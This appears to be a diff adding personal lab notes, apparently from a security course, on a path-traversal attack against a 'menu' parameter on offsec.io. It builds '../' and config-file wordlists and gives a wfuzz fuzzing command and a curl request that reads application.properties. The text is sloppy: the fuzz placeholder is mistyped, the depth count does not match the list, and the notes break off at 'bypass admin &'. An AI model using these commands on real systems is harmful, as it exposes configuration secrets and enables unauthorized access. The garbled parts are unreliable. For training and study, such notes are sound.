@@ -1,0 +1,33 @@
+save in a txt file: paths.txt
+ 
+ ../
+ ../../
+ ../../../
+ 
+
+
+we will go 7 times the ../ then add /windows/win.ini at end
+
+save a text file: files.txt
+
+application.properties
+application.yml
+config/application.properties
+config/application.yml
+
+
+wfuzz sent 28 requests
+[--hh filter out responses]
+
+
+wfuzz -w paths.txt -w files.txt --hh 0 https://offsec.io/specials?menu=FUZZFUUZ2Z
+ 
+ 
+ this will return a output :
+ 
+ ../ - config/application.properties
+
+curl https://offsec.io/specials?menu=../config/application.properties
+
+
+this how we can bypass admin & 
